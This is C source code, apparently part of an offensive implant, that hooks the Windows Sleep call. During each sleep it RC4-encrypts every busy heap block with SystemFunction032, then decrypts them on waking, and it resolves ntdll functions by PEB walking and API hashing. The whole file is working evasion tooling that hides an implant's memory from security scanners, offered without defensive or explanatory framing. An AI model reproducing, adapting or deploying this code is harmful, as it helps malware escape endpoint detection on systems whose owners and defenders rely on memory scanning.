#include "Common.h"

typedef struct {
    D_API( NtDelayExecution );
    D_API( RtlInitUnicodeString );
    D_API( LdrLoadDll );
    D_API( LdrUnloadDll );
    D_API( RtlWalkHeap );
    D_API( RtlRandomEx );
    D_API( SystemFunction032 );
} API, *PAPI ;

#define H_LIB_NTDLL                     0x1edab0ed 
#define H_API_NTDELAYEXECUTION          0xf5a936aa
#define H_API_LDRLOADDLL                0x9e456a43
#define H_API_LDRUNLOADDLL              0xd995c1e6
#define H_API_RTLINITUNICODESTRING      0xef52b589
#define H_API_RTLWALKHEAP               0x182bae64
#define H_API_RTLRANDOMEX               0x7f1224f5
#define H_API_SYSTEMFUNCTION032         0xe58c8805


D_SEC( D ) VOID HeapEncryptDecrypt( _In_ PAPI Api, _In_ unsigned char enckey[32] )
{
    RTL_HEAP_WALK_ENTRY entry;
    RtlSecureZeroMemory( &entry, sizeof( entry ) );

    while ( NT_SUCCESS(Api->RtlWalkHeap(GetProcessHeap_Hook(), &entry)) )
    {
        if (entry.Flags == RTL_PROCESS_HEAP_ENTRY_BUSY)
        {
            USTRING key;
            USTRING data;

            key.len = key.maxlen = 32;
            key.str = enckey;
            data.len = data.maxlen = entry.DataSize;
            data.str = (PBYTE)(entry.DataAddress);

            Api->SystemFunction032(&data, &key);
        };
    };
};

D_SEC( D ) VOID WINAPI Sleep_Hook( _In_ DWORD dwMilliseconds ) 
{
    
    API                 Api;
    UNICODE_STRING      Uni;
    
    LARGE_INTEGER       Time;
    PLARGE_INTEGER      TimePtr;

    HMODULE	            Csp = NULL;
    ULONG               seed;
    unsigned char       enckey[32];

    TimePtr = &Time;
    TimePtr->QuadPart = dwMilliseconds * -10000LL;

    RtlSecureZeroMemory( &Api, sizeof( Api ) );
    RtlSecureZeroMemory( &Uni, sizeof( Uni ) );

    Api.NtDelayExecution      = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTDELAYEXECUTION );
    Api.RtlWalkHeap           = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLWALKHEAP );
    Api.RtlRandomEx           = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLRANDOMEX );
    Api.RtlInitUnicodeString  = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLINITUNICODESTRING );
    Api.LdrLoadDll            = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRLOADDLL );
    Api.LdrUnloadDll          = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRUNLOADDLL );
    
    seed = 1337;
    for(int i = 0; i < 32; i++)
    {
        enckey[i] = (char)"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890"[(Api.RtlRandomEx(&seed)) % 63];
    };

    Api.RtlInitUnicodeString( &Uni, C_PTR( G_SYM( L"cryptsp.dll" ) ) );
    Api.LdrLoadDll( NULL, 0, &Uni, &Csp );

    if ( Csp != NULL)
    {
        Api.SystemFunction032 = PeGetFuncEat( Csp, H_API_SYSTEMFUNCTION032 );

        HeapEncryptDecrypt( &Api, enckey );
        Api.NtDelayExecution( (BOOLEAN)FALSE, TimePtr );
        HeapEncryptDecrypt( &Api, enckey );

        Api.LdrUnloadDll( Csp );
        Csp = NULL;
    };
    RtlSecureZeroMemory( &Api, sizeof( Api ) );
    RtlSecureZeroMemory( &Uni, sizeof( Uni ) );
};
